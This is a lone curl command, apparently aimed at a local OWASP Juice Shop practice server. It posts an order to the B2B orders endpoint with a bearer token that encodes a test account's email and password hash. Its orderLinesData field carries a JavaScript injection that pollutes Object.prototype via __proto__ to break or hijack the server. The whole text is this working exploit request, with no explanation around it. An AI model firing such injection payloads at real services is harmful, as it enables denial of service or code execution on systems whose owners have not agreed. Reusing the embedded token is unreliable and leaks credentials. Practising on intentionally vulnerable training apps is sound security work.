curl -X 'POST' \
  'http://localhost:3000/b2b/v2/orders' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MywidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImJlbmRlckBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMGMzNmU1MTdlM2ZhOTVhYWJmMWJiZmZjNjc0NGE0ZWYiLCJyb2xlIjoiZGVsdXhlIiwiZGVsdXhlVG9rZW4iOiIwNWQwZmJkNWM3NGE2YWVjZjczODE5ZDk1NTllODc2NmU4NGI3MzE2NzAyNzRlNTg4YjRlOGQ5ZmYxMjM3ZTBlIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDIzLTA1LTIyVDA5OjI4OjA0LjE2OVoiLCJ1cGRhdGVkQXQiOiIyMDIzLTA1LTIyVDExOjA1OjMyLjQ1NVoiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE2ODQ3NTM1MzJ9.wUrnfRg4Tg89i2Y4MUOWdPEtM1w1sAkz1ousSKeyE4cYfAMR50ed8t0-a_HTEenQs2lDr4vF5P8CvJeKxrbyyH_oiQffjLpmF34JdFWDJUaSp3yWWLFYvUYt2rN6Aae3OTp1f_Z85W6JJ1voivhyMoP1Bruwpi95MEWgQOqAqo0' \
  -H 'Content-Type: application/json' \
  -d '{
    "cid": "JS0815DE",
    "orderLines": [
      {
        "productId": 8,
        "quantity": 500,
        "customerReference": "PO0000001"
      }
    ],
    "orderLinesData": "Object.defineProperty(({})[[\"__proto__\"]][[\"__proto__\"]], '\''toString'\'', { value: \"hi\" });"
}'
